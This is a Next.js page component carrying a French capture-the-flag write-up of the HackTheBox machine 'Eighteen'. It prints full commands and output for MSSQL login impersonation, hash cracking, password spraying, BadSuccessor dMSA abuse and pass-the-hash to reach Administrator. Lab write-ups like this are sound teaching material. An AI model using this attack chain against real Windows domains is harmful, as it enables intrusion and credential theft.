import { Terminal, Key, Database, Shield, Users } from "lucide-react";
import { PageHeader } from "@/components/PageHeader";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Eighteen | Writeup HTB | 0xbbuddha",
  description: "Writeup de la machine Eighteen (HackTheBox, Easy, Windows) – MSSQL impersonation, hashcat, BadSuccessor dMSA.",
};

export default function WriteupEighteenPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Writeup"
        title="Eighteen"
        description="Creds MSSQL fournis. Impersonation de login pour extraire un hash depuis une DB interne, crack et spray WinRM, puis exploitation BadSuccessor (dMSA) pour hériter des credentials Administrator."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Writeups", href: "/writeups" },
          { label: "Eighteen" },
        ]}
        stats={[
          { label: "Platform", value: "HackTheBox" },
          { label: "Difficulty", value: "Easy" },
          { label: "Date", value: "2025-12-16" },
        ]}
      />

      <article className="mt-8 space-y-10">

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            1. Reconnaissance
          </h2>
          <p className="text-muted-foreground">
            Scan Nmap sur la machine <strong>DC01.eighteen.htb</strong> (10.10.11.95). Trois ports ouverts : HTTP (80, IIS), MSSQL 2022 (1433), WinRM (5985). Domaine AD : <strong>eighteen.htb</strong>.
          </p>
          <CodeBlock title="Commande">
{`nmap -Pn -sV -p- 10.10.11.95 -T5`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Creds fournis en début de machine : <strong>kevin / iNa2we6haRj2gaw!</strong>
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            2. Accès MSSQL (kevin)
          </h2>
          <p className="text-muted-foreground">
            Authentification locale sur MSSQL avec les creds fournis. Kevin est connecté en tant que <code className="rounded bg-muted px-1">guest</code> sur la DB, pas sysadmin, accès limité.
          </p>
          <CodeBlock title="Commande">
{`nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`MSSQL  10.10.11.95  1433  DC01  [+] DC01\kevin:iNa2we6haRj2gaw!`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Énumération des logins SQL : kevin et <strong>appdev</strong> sont présents. Depuis <code className="rounded bg-muted px-1">mssqlclient.py</code>, vérification des permissions : kevin ne peut pas accéder à la base <strong>financial_planner</strong> directement.
          </p>
          <CodeBlock title="Connexion directe">
{`mssqlclient.py 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.10.11.95'`}
          </CodeBlock>
          <CodeBlock title="Vérification">
{`SQL (kevin  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
-- 0 → non sysadmin

SQL (kevin  guest@master)> USE financial_planner;
-- ERROR: The server principal "kevin" is not able to access the database`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            3. Impersonation appdev → extraction du hash
          </h2>
          <p className="text-muted-foreground">
            Le login <strong>appdev</strong> a accès à <code className="rounded bg-muted px-1">financial_planner</code>. Kevin peut l&apos;impersoner via <code className="rounded bg-muted px-1">EXECUTE AS LOGIN</code>. La table <strong>users</strong> contient un hash Flask/PBKDF2 de l&apos;utilisateur admin.
          </p>
          <CodeBlock title="Impersonation et lecture">
{`SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev';
SQL (appdev  appdev@master)> USE financial_planner;
SQL (appdev  appdev@financial_planner)> SELECT * FROM users;`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`id    username   email                password_hash                                               is_admin
----  ---------  -------------------  ----------------------------------------------------------  --------
1002  admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad...887133       1`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Hash PBKDF2-SHA256 (600 000 rounds). Crackage avec hashcat mode <strong>10900</strong> sur rockyou.
          </p>
          <CodeBlock title="Hashcat">
{`hashcat -m 10900 hash.txt ~/Downloads/rockyou.txt`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOt...Q=:iloveyou1`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Mot de passe crack : <strong>iloveyou1</strong>.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Users className="size-5 text-primary" />
            4. Spray WinRM → adam.scott
          </h2>
          <p className="text-muted-foreground">
            RID brute via MSSQL pour obtenir la liste des utilisateurs du domaine. Spray du mot de passe cracké sur WinRM.
          </p>
          <CodeBlock title="Commande">
{`nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute`}
          </CodeBlock>
          <CodeBlock title="Utilisateurs identifiés (extrait)" result>
{`1606: EIGHTEEN\jamie.dunn
1607: EIGHTEEN\jane.smith
1608: EIGHTEEN\alice.jones
1609: EIGHTEEN\adam.scott
1610: EIGHTEEN\bob.brown
1611: EIGHTEEN\carol.white
1612: EIGHTEEN\dave.green`}
          </CodeBlock>
          <CodeBlock title="Spray WinRM">
{`nxc winrm 10.10.11.95 -u users.txt -p 'iloveyou1' --no-bruteforce`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`WINRM  10.10.11.95  5985  DC01  [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)`}
          </CodeBlock>
          <CodeBlock title="Connexion WinRM">
{`evil-winrm-py -i 10.10.11.95 -u adam.scott -p 'iloveyou1'`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            5. Escalade de privilèges : BadSuccessor (dMSA)
          </h2>
          <p className="text-muted-foreground">
            Énumération des ACL sur les OUs avec <strong>PowerView</strong>. Le groupe <strong>IT</strong> (dont adam.scott est membre, RID 1604) possède <code className="rounded bg-muted px-1">CreateChild</code> sur <strong>OU=Staff</strong>.
          </p>
          <CodeBlock title="Commande">
{`Import-Module .\PowerView.ps1
Get-DomainObjectAcl -Identity "OU=Staff,DC=eighteen,DC=htb" -ResolveGUIDS |
  ? { $_.SecurityIdentifier -match "1604" }`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`ActiveDirectoryRights : CreateChild
SecurityIdentifier    : S-1-5-21-...-1604  (IT)`}
          </CodeBlock>
          <p className="text-muted-foreground">
            <strong>BadSuccessor</strong> exploite <code className="rounded bg-muted px-1">CreateChild</code> sur une OU pour créer un compte dMSA (<em>Delegated Managed Service Account</em>) et lui faire hériter les credentials d&apos;un compte cible. On crée <strong>web_svc</strong> dans OU=Staff, lié à Administrator.
          </p>
          <CodeBlock title="Exploitation BadSuccessor">
{`.\BadSuccessor.exe escalate \
  -targetOU "OU=Staff,DC=eighteen,DC=htb" \
  -dmsa web_svc \
  -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" \
  -dnshostname web_svc \
  -user adam.scott`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] Privileges Obtained.
[+] Created dMSA 'web_svc' in 'OU=Staff,DC=eighteen,DC=htb',
    linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            6. Récupération du hash Administrator
          </h2>
          <p className="text-muted-foreground">
            On obtient un TGT pour adam.scott, puis on demande un ST pour le dMSA <strong>web_svc$</strong> avec le flag <code className="rounded bg-muted px-1">-dmsa</code>. Même si la requête S4U2Proxy échoue, Kerberos expose dans sa réponse les <em>previous keys</em> du dMSA, ce sont les clés héritées d&apos;Administrator.
          </p>
          <CodeBlock title="TGT adam.scott">
{`getTGT.py eighteen.htb/adam.scott:'iloveyou1'`}
          </CodeBlock>
          <CodeBlock title="ST pour web_svc$ (dMSA)">
{`getST.py -k -no-pass -impersonate 'web_svc$' -dmsa -spn cifs/dc01.eighteen.htb eighteen.htb/adam.scott`}
          </CodeBlock>
          <CodeBlock title="Résultat (previous keys)" result>
{`[*] Previous keys:
[*] EncryptionTypes.rc4_hmac: 0b133be956bfaddf9cea56701affddec  ← hash Administrator`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Le RC4 NTLM extrait est celui d&apos;<strong>Administrator</strong>. Pass-the-Hash via WinRM.
          </p>
          <CodeBlock title="Pass-the-Hash Administrator">
{`evil-winrm-py -i dc01.eighteen.htb -u Administrator -H 0b133be956bfaddf9cea56701affddec`}
          </CodeBlock>
          <CodeBlock title="Flags">
{`type C:\\Users\\adam.scott\\Desktop\\user.txt
type C:\\Users\\Administrator\\Desktop\\root.txt`}
          </CodeBlock>
        </section>

        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li>Recon : DC01 : IIS (80), MSSQL (1433), WinRM (5985), creds kevin fournis</li>
            <li>MSSQL : EXECUTE AS appdev → financial_planner.users → hash PBKDF2 admin</li>
            <li>Hashcat -m 10900 → iloveyou1</li>
            <li>RID brute → liste utilisateurs → spray WinRM → adam.scott (Pwn3d!)</li>
            <li>PowerView : IT group (RID 1604) a CreateChild sur OU=Staff</li>
            <li>BadSuccessor : dMSA web_svc créé dans OU=Staff, lié à Administrator</li>
            <li>getST.py -dmsa → previous keys → RC4 hash Administrator</li>
            <li>PTH evil-winrm → root</li>
          </ul>
        </section>

      </article>
    </div>
  );
}
